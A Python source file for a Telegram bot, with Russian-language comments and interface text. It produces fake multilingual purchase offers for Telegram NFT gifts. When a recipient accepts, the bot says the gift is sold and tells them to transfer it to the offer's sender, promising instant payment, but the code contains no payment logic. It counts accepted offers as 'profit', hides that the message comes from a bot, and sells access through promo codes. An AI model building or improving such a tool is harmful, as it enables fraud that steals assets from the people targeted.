import asyncio
import logging
import uuid
import re
import sqlite3
import os
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent, ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.exceptions import TelegramBadRequest

# ==========================================
# НАСТРОЙКИ БОТА
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН")
ADMIN_USERNAME = "chingiz_trader"
DB_PATH = '/app/data/bot_database.db'

def is_admin(user):
    return user.username and user.username.lower() == ADMIN_USERNAME.lower()

# ==========================================
# БАЗА ДАННЫХ (С АВТО-ОБНОВЛЕНИЕМ)
# ==========================================
def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, profit INTEGER DEFAULT 0, access_until TEXT, is_banned INTEGER DEFAULT 0
    )''')
    # Добавляем колонку бана, если база старая
    try:
        cursor.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass

    # Таблица промокодов
    cursor.execute('''CREATE TABLE IF NOT EXISTS promos (
        code TEXT PRIMARY KEY, days INTEGER, is_used INTEGER DEFAULT 0
    )''')
    
    # НОВОЕ: Таблица истории офферов
    cursor.execute('''CREATE TABLE IF NOT EXISTS offers_history (
        offer_id TEXT PRIMARY KEY, seller_id INTEGER, buyer_id INTEGER, price TEXT, currency TEXT, gift_name TEXT, status TEXT, created_at TEXT
    )''')
    
    conn.commit()
    conn.close()

# --- Функции работы с БД ---
def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT profit, access_until, is_banned FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row if row else (0, None, 0)

def add_user(user_id, username):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
    conn.commit()
    conn.close()

def add_profit(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET profit = profit + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def set_access(user_id, days):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, "user"))
    days = int(days)
    if days == 9999:
        new_date = "2099-12-31 23:59:59"
    else:
        cursor.execute("SELECT access_until FROM users WHERE user_id = ?", (user_id,))
        current = cursor.fetchone()[0]
        now = datetime.now()
        if current and current != "None":
            try:
                current_dt = datetime.strptime(current, "%Y-%m-%d %H:%M:%S")
                base_date = current_dt if current_dt > now else now
            except ValueError:
                base_date = now
        else:
            base_date = now
        new_date = (base_date + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("UPDATE users SET access_until = ? WHERE user_id = ?", (new_date, user_id))
    conn.commit()
    conn.close()

def revoke_access(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET access_until = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def toggle_ban(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if row:
        new_status = 0 if row[0] == 1 else 1
        cursor.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (new_status, user_id))
        conn.commit()
        conn.close()
        return new_status
    conn.close()
    return 0

def log_offer(offer_id, seller_id, price, currency, gift_name):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO offers_history (offer_id, seller_id, price, currency, gift_name, status, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
                   (offer_id, seller_id, price, currency, gift_name, 'pending', datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def update_offer_status(offer_id, status, buyer_id=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    if buyer_id:
        cursor.execute("UPDATE offers_history SET status = ?, buyer_id = ? WHERE offer_id = ?", (status, buyer_id, offer_id))
    else:
        cursor.execute("UPDATE offers_history SET status = ? WHERE offer_id = ?", (status, offer_id))
    conn.commit()
    conn.close()

def get_user_history(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT price, currency, gift_name, status, created_at FROM offers_history WHERE seller_id = ? ORDER BY created_at DESC LIMIT 5", (user_id,))
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_deep_stats():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM offers_history")
    total_offers = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM offers_history WHERE status = 'accepted'")
    accepted = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM offers_history WHERE status = 'declined'")
    declined = cursor.fetchone()[0]
    conn.close()
    return total_offers, accepted, declined

def get_stats():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("SELECT COUNT(*) FROM users WHERE (access_until = '2099-12-31 23:59:59' OR access_until > ?) AND is_banned = 0", (now_str,))
    active_users = cursor.fetchone()[0]
    cursor.execute("SELECT SUM(profit) FROM users")
    total_profit = cursor.fetchone()[0] or 0
    conn.close()
    return total_users, active_users, total_profit

def create_promo(days):
    code = "PRO-" + str(uuid.uuid4())[:6].upper()
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO promos (code, days) VALUES (?, ?)", (code, days))
    conn.commit()
    conn.close()
    return code

def use_promo(user_id, code):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT days, is_used FROM promos WHERE code = ?", (code,))
    row = cursor.fetchone()
    if not row:
        conn.close()
        return False, "❌ Промокод не найден."
    if row[1] == 1:
        conn.close()
        return False, "❌ Этот промокод уже был использован."
    set_access(user_id, row[0])
    cursor.execute("UPDATE promos SET is_used = 1 WHERE code = ?", (code,))
    conn.commit()
    conn.close()
    return True, row[0]

# ==========================================
# СОСТОЯНИЯ И ПЕРЕВОДЫ
# ==========================================
class PromoState(StatesGroup):
    waiting_for_code = State()

class AdminState(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_grant_days = State()

active_offers = {}
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

TEXTS = {
    # (Оставляем словари TEXTS без изменений, как в предыдущем коде)
    'ru': {
        'offer': "User <b>{seller}</b> offers you <b>{price} {currency_icon}</b> for {gift_link}.\n\n{time_left}",
        'btn_decline': "Decline", 'btn_accept': "Accept",
        'rejected': "❌ Offer for {gift_name} was declined.",
        'alert': "<b>{seller}</b>\n\nНажмите на кнопку «Передать NFT» под сообщением.\n\nПередайте подарок отправителю предложения.\nОплату зачислим моментально.",
        'sold': "🎁 Gift {gift_name} successfully sold!\n\nTransfer the gift to the buyer for credit {price} {currency_icon}.",
        'btn_transfer': "Transfer NFT",
        'btn_how': "How to transfer?"
    },
    'en': {
        'offer': "User <b>{seller}</b> offers you <b>{price} {currency_icon}</b> for {gift_link}.\n\n{time_left}",
        'btn_decline': "Decline", 'btn_accept': "Accept",
        'rejected': "❌ Offer for {gift_name} was declined.",
        'alert': "<b>{seller}</b>\n\nClick the 'Transfer NFT' button below the message.\n\nTransfer the gift to the sender of the offer.\nPayment will be credited instantly.",
        'sold': "🎁 Gift {gift_name} successfully sold!\n\nTransfer the gift to the buyer for credit {price} {currency_icon}.",
        'btn_transfer': "Transfer NFT",
        'btn_how': "How to transfer?"
    },
    'ua': {
        'offer': "User <b>{seller}</b> offers you <b>{price} {currency_icon}</b> for {gift_link}.\n\n{time_left}",
        'btn_decline': "Відхилити", 'btn_accept': "Прийняти",
        'rejected': "❌ Пропозицію щодо {gift_name} відхилено.",
        'alert': "<b>{seller}</b>\n\nНатисніть кнопку «Передати NFT» під повідомленням.\n\nПередайте подарунок відправнику пропозиції.\nОплату буде зараховано моментально.",
        'sold': "🎁 Gift {gift_name} successfully sold!\n\nTransfer the gift to the buyer for credit {price} {currency_icon}.",
        'btn_transfer': "Transfer NFT",
        'btn_how': "How to transfer?"
    },
    'ar': {
        'offer': "User <b>{seller}</b> offers you <b>{price} {currency_icon}</b> for {gift_link}.\n\n{time_left}",
        'btn_decline': "رفض", 'btn_accept': "قبول",
        'rejected': "❌ تم رفض العرض الخاص بـ {gift_name}.",
        'alert': "<b>{seller}</b>\n\nاضغط على زر 'Transfer NFT' أسفل الرسالة.\n\nقم بتحويل الهدية إلى مرسل العرض.\nسيتم إضافة الدفع على الفور.",
        'sold': "🎁 Gift {gift_name} successfully sold!\n\nTransfer the gift to the buyer for credit {price} {currency_icon}.",
        'btn_transfer': "Transfer NFT",
        'btn_how': "How to transfer?"
    },
    'china': {
        'offer': "User <b>{seller}</b> offers you <b>{price} {currency_icon}</b> for {gift_link}.\n\n{time_left}",
        'btn_decline': "拒绝", 'btn_accept': "接受",
        'rejected': "❌ 关于 {gift_name} 的报价已被拒绝。",
        'alert': "<b>{seller}</b>\n\n点击消息下方的“Transfer NFT”按钮。\n\n将礼物转移给报价发送者。\n付款将即时到账。",
        'sold': "🎁 Gift {gift_name} successfully sold!\n\nTransfer the gift to the buyer for credit {price} {currency_icon}.",
        'btn_transfer': "Transfer NFT",
        'btn_how': "How to transfer?"
    }
}

def format_nft_name(link: str) -> str:
    raw_name = link.split('/')[-1].split('?')[0] 
    spaced_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name) 
    return spaced_name.replace('-', ' #')

def get_time_left(created_at: datetime) -> str:
    expires_at = created_at + timedelta(hours=24)
    now = datetime.now()
    remaining = expires_at - now
    if remaining.total_seconds() <= 0: return "Expired"
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, _ = divmod(remainder, 60)
    return f"Expires in {hours}H {minutes}M"

def get_main_kb():
    return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="👤 Профиль"), KeyboardButton(text="🎟 Ввести промокод")]], resize_keyboard=True)

async def edit_offer_message(callback: CallbackQuery, text: str, reply_markup=None, disable_web_page_preview=True):
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=disable_web_page_preview)
        else:
            await bot.edit_message_text(chat_id=callback.message.chat.id, message_id=callback.message.message_id, text=text, reply_markup=reply_markup, parse_mode="HTML", business_connection_id=callback.message.business_connection_id, disable_web_page_preview=disable_web_page_preview)
    except TelegramBadRequest as e:
        print(f"⚠️ Ошибка редактирования: {e}")

# ==========================================
# ХЭНДЛЕРЫ (ПОЛЬЗОВАТЕЛЬСКИЕ)
# ==========================================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    add_user(message.from_user.id, message.from_user.username)
    text = "<b>👋 Привет! Я бот для создания офферов на NFT-подарки.</b>\n\n<i>Для использования бота нужен доступ. Введите промокод в личном кабинете!</i>"
    await message.answer(text, parse_mode="HTML", reply_markup=get_main_kb())

@dp.message(F.text == "👤 Профиль")
async def show_profile(message: Message):
    user_id = message.from_user.id
    profit, access_until, is_banned = get_user(user_id)
    is_premium = "Да ✅" if message.from_user.is_premium else "Нет ❌"
    
    if is_banned:
        await message.answer("🚫 <b>Вы заблокированы в этом боте.</b>", parse_mode="HTML")
        return

    if access_until and access_until != "None":
        if access_until == "2099-12-31 23:59:59": access_text = "Навсегда ♾️"
        else:
            try:
                dt = datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S")
                access_text = "Истек ❌" if dt < datetime.now() else f"До {dt.strftime('%d.%m.%Y %H:%M')} 📅"
            except ValueError: access_text = "Ошибка БД ❌"
    else: access_text = "Нет доступа ❌"
    
    text = f"<b>👤 Ваш профиль</b>\n\n🆔 <b>ID:</b> <code>{user_id}</code>\n💎 <b>Premium:</b> {is_premium}\n📈 <b>Сделок:</b> {profit}\n🔑 <b>Доступ:</b> {access_text}"
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "🎟 Ввести промокод")
async def ask_promo(message: Message, state: FSMContext):
    await message.answer("Отправьте ваш промокод:")
    await state.set_state(PromoState.waiting_for_code)

@dp.message(PromoState.waiting_for_code)
async def process_promo(message: Message, state: FSMContext):
    success, result = use_promo(message.from_user.id, message.text.strip().upper())
    if success: await message.answer(f"✅ <b>Промокод активирован!</b>\nДоступ выдан на: <b>{'Навсегда' if result == 9999 else f'{result} дн.'}</b>", parse_mode="HTML")
    else: await message.answer(result)
    await state.clear()

# ==========================================
# АДМИН-ПАНЕЛЬ (ГЛУБОКАЯ)
# ==========================================
@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if not is_admin(message.from_user): return await message.answer("Нет прав.")
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1 День", callback_data="genpromo_1"), InlineKeyboardButton(text="7 Дней", callback_data="genpromo_7")],
        [InlineKeyboardButton(text="30 Дней", callback_data="genpromo_30"), InlineKeyboardButton(text="Навсегда", callback_data="genpromo_9999")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="show_stats"), InlineKeyboardButton(text="📈 Глубокая статистика", callback_data="deep_stats")],
        [InlineKeyboardButton(text="👤 Управление юзером", callback_data="manage_user")]
    ])
    await message.answer("<b>👑 Админ-панель</b>", reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data.startswith("genpromo_"))
async def generate_promo(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    days = int(callback.data.split("_")[1])
    code = create_promo(days)
    await callback.message.answer(f"✅ Промокод на {days if days != 9999 else 'Всю жизнь'} дн:\n\n<code>{code}</code>", parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "show_stats")
async def show_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    total_u, active_u, total_deals = get_stats()
    await callback.message.answer(f"<b>📊 Статистика</b>\n\n👥 Юзеров: {total_u}\n✅ С доступом: {active_u}\n🤝 Сделок: {total_deals}", parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "deep_stats")
async def deep_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    total_offers, accepted, declined = get_deep_stats()
    text = (
        f"<b>📈 Глубокая статистика бота</b>\n\n"
        f"📦 <b>Всего создано офферов:</b> {total_offers}\n"
        f"✅ <b>Успешно принято:</b> {accepted}\n"
        f"❌ <b>Отклонено:</b> {declined}\n"
    )
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

# --- УПРАВЛЕНИЕ ЮЗЕРОМ ---
@dp.callback_query(F.data == "manage_user")
async def manage_user_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    await callback.message.answer("Введите <b>ID пользователя</b> (например, <code>123456789</code>):", parse_mode="HTML")
    await state.set_state(AdminState.waiting_for_user_id)
    await callback.answer()

@dp.message(AdminState.waiting_for_user_id)
async def process_user_id(message: Message, state: FSMContext):
    if not is_admin(message.from_user): return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ ID должен быть числом. Попробуйте снова.")
        return
    
    profit, access_until, is_banned = get_user(target_id)
    
    # Форматируем дату
    if access_until and access_until != "None":
        if access_until == "2099-12-31 23:59:59": access_text = "Навсегда ♾️"
        else:
            try:
                dt = datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S")
                access_text = "Истек ❌" if dt < datetime.now() else f"До {dt.strftime('%d.%m.%Y %H:%M')} 📅"
            except: access_text = "Ошибка ❌"
    else: access_text = "Нет доступа ❌"
    
    ban_text = "🚫 Забанен" if is_banned else "✅ Активен"
    
    text = (
        f"<b>👤 Информация о пользователе</b>\n\n"
        f"🆔 <b>ID:</b> <code>{target_id}</code>\n"
        f"📈 <b>Сделок:</b> {profit}\n"
        f"🔑 <b>Доступ:</b> {access_text}\n"
        f"⚔️ <b>Статус:</b> {ban_text}\n"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔨 Забанить/Разбанить", callback_data=f"toggleban_{target_id}")],
        [InlineKeyboardButton(text="🎁 Выдать доступ", callback_data=f"grant_{target_id}"), InlineKeyboardButton(text="❌ Забрать доступ", callback_data=f"revoke_{target_id}")],
        [InlineKeyboardButton(text="📜 История офферов", callback_data=f"history_{target_id}")]
    ])
    
    await message.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data.startswith("toggleban_"))
async def toggle_user_ban(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    target_id = int(callback.data.split("_")[1])
    new_status = toggle_ban(target_id)
    
    status_text = "🚫 Пользователь забанен!" if new_status == 1 else "✅ Пользователь разбанен!"
    await callback.answer(status_text, show_alert=True)
    await callback.message.edit_text(f"Статус пользователя <code>{target_id}</code> изменен. Нажмите 'Управление юзером' заново, чтобы обновить профиль.", parse_mode="HTML")

@dp.callback_query(F.data.startswith("revoke_"))
async def revoke_user_access(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    target_id = int(callback.data.split("_")[1])
    revoke_access(target_id)
    await callback.answer("❌ Доступ забран!", show_alert=True)
    await callback.message.edit_text(f"Доступ пользователя <code>{target_id}</code> аннулирован.", parse_mode="HTML")

@dp.callback_query(F.data.startswith("grant_"))
async def grant_user_access_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    target_id = int(callback.data.split("_")[1])
    await state.update_data(target_id=target_id)
    await callback.message.answer(f"На сколько дней выдать доступ пользователю <code>{target_id}</code>? (Введите число, например: 7 или 30)", parse_mode="HTML")
    await state.set_state(AdminState.waiting_for_grant_days)
    await callback.answer()

@dp.message(AdminState.waiting_for_grant_days)
async def process_grant_days(message: Message, state: FSMContext):
    if not is_admin(message.from_user): return
    try:
        days = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Введите число (например, 7).")
        return
    
    data = await state.get_data()
    target_id = data.get("target_id")
    
    set_access(target_id, days)
    await message.answer(f"✅ Пользователю <code>{target_id}</code> выдан доступ на <b>{days} дней</b>.", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data.startswith("history_"))
async def show_user_history(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    target_id = int(callback.data.split("_")[1])
    history = get_user_history(target_id)
    
    if not history:
        return await callback.answer("У этого пользователя еще нет офферов.", show_alert=True)
        
    text = f"<b>📜 Последние 5 офферов пользователя {target_id}</b>\n\n"
    for row in history:
        price, currency, gift_name, status, created_at = row
        icon = "✅" if status == 'accepted' else "❌" if status == 'declined' else "⏳"
        text += f"{icon} <b>{gift_name}</b> за {price} {currency} | {created_at}\n"
        
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

# ==========================================
# ЛОГИКА ОФФЕРОВ (С ИСТОРИЕЙ)
# ==========================================
def check_access(user):
    if is_admin(user): return True, ""
    
    _, access_until, is_banned = get_user(user.id)
    
    if is_banned: return False, "🚫 <b>Вы заблокированы в этом боте.</b>"
    if not access_until or access_until == "None": return False, "❌ <b>У вас нет доступа!</b>"
    if access_until == "2099-12-31 23:59:59": return True, ""
    try: 
        is_active = datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S") > datetime.now()
        return (True, "") if is_active else (False, "❌ <b>Ваш доступ истек!</b>")
    except ValueError: return False, "❌ Ошибка базы данных."

async def create_offer_logic(message: Message, is_business: bool):
    has_access, error_msg = check_access(message.from_user)
    if not has_access: return await message.answer(error_msg, parse_mode="HTML")

    parts = message.text.split()
    if len(parts) < 4: return 
    
    nft_link, price, currency = parts[1], parts[2], parts[3].lower()
    lang = parts[4].lower() if len(parts) > 4 else 'ru'
    
    if lang not in TEXTS: lang = 'ru'
    if currency not in ['stars', 'gram']: return
    
    gift_name_plain = format_nft_name(nft_link)
    link_url = nft_link if nft_link.startswith('http') else f"https://{nft_link}"
    gift_link = f'<a href="{link_url}">{link_url}</a>'
    currency_icon = "⭐️" if currency == "stars" else "GRAM"
    
    seller_username, seller_name, seller_id = message.from_user.username, message.from_user.full_name, message.from_user.id
    
    offer_id = str(uuid.uuid4())[:8]
    created_at = datetime.now()
    
    active_offers[offer_id] = {
        'seller_username': seller_username, 'seller_name': seller_name, 'seller_id': seller_id,
        'price': price, 'currency_icon': currency_icon, 'gift_name': gift_name_plain,
        'nft_link': link_url, 'lang': lang, 'created_at': created_at
    }
    
    # Логируем оффер в БД
    log_offer(offer_id, seller_id, price, currency, gift_name_plain)
    
    t = TEXTS[lang]
    time_left = get_time_left(created_at)
    
    offer_text = t['offer'].format(seller=seller_username or seller_name, price=price, currency_icon=currency_icon, gift_link=gift_link, time_left=time_left)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t['btn_accept'], callback_data=f"accept_{offer_id}"),
        InlineKeyboardButton(text=t['btn_decline'], callback_data=f"decline_{offer_id}")
    ]])
    
    if is_business:
        try:
            await asyncio.sleep(1)
            await bot.send_message(message.chat.id, text=offer_text, reply_markup=kb, parse_mode="HTML", business_connection_id=message.business_connection_id)
        except Exception as e: print(e)
    else:
        bot_username = (await bot.get_me()).username
        await message.answer(f"✅ <b>Оффер готов!</b>\nКод: <code>{offer_id}</code>\n\nОтправьте: <code>@{bot_username} {offer_id}</code>", parse_mode="HTML")

@dp.business_message(F.text.startswith('/of '))
async def catch_biz(message: Message): await create_offer_logic(message, True)

@dp.message(F.text.startswith('/of '))
async def catch_priv(message: Message): await create_offer_logic(message, message.business_connection_id is not None)

@dp.inline_query()
async def handle_inline_query(inline_query: InlineQuery):
    offer_data = active_offers.get(inline_query.query.strip())
    if not offer_data: return await inline_query.answer([InlineQueryResultArticle(id="1", title="❌ Не найдено", input_message_content=InputTextMessageContent(message_text="Оффер не найден."))], cache_time=0, is_personal=True)
    
    t = TEXTS[offer_data['lang']]
    link_url = offer_data['nft_link']
    gift_link = f'<a href="{link_url}">{link_url}</a>'
    time_left = get_time_left(offer_data['created_at'])
    
    offer_text = t['offer'].format(seller=offer_data['seller_username'] or offer_data['seller_name'], price=offer_data['price'], currency_icon=offer_data['currency_icon'], gift_link=gift_link, time_left=time_left)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t['btn_accept'], callback_data=f"accept_{inline_query.query.strip()}"),
        InlineKeyboardButton(text=t['btn_decline'], callback_data=f"decline_{inline_query.query.strip()}")
    ]])
    
    await inline_query.answer([InlineQueryResultArticle(id=inline_query.query.strip(), title="Оффер", input_message_content=InputTextMessageContent(message_text=offer_text, parse_mode="HTML"), reply_markup=kb)], cache_time=0, is_personal=True, hide_via=True)

@dp.callback_query(F.data.startswith('decline_'))
async def decline_offer(callback: CallbackQuery):
    offer_id = callback.data.split('_')[1]
    data = active_offers.get(offer_id)
    if not data: return await callback.answer("❌ Оффер устарел.", show_alert=True)
    
    t = TEXTS[data['lang']]
    text = t['rejected'].format(gift_name=data['gift_name'])
    
    # Обновляем статус в БД
    update_offer_status(offer_id, 'declined', callback.from_user.id)
    
    await edit_offer_message(callback, text, reply_markup=None, disable_web_page_preview=True)
    active_offers.pop(offer_id, None)
    await callback.answer()

@dp.callback_query(F.data.startswith('accept_'))
async def accept_offer(callback: CallbackQuery):
    offer_id = callback.data.split('_')[1]
    data = active_offers.get(offer_id)
    if not data: return await callback.answer("❌ Оффер устарел.", show_alert=True)

    t = TEXTS[data['lang']]
    add_profit(data['seller_id'])
    
    # Обновляем статус в БД
    update_offer_status(offer_id, 'accepted', callback.from_user.id)

    target = data['seller_username'] or data['seller_name']
    await callback.answer(text=t['alert'].format(seller=target), show_alert=True)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t['btn_transfer'], url=data['nft_link'])],
        [InlineKeyboardButton(text=t['btn_how'], url="https://telegram.org/blog/gifts#transfer-and-resell-gifts")]
    ])
    
    text = t['sold'].format(gift_name=data['gift_name'], price=data['price'], currency_icon=data['currency_icon'])
    
    await edit_offer_message(callback, text, reply_markup=kb, disable_web_page_preview=False)
    active_offers.pop(offer_id, None)

async def main():
    init_db()
    logging.basicConfig(level=logging.INFO)
    print("Бот запущен...")
    await dp.start_polling(bot, allowed_updates=["message", "business_connection", "business_message", "callback_query", "inline_query"])

if __name__ == "__main__":
    asyncio.run(main())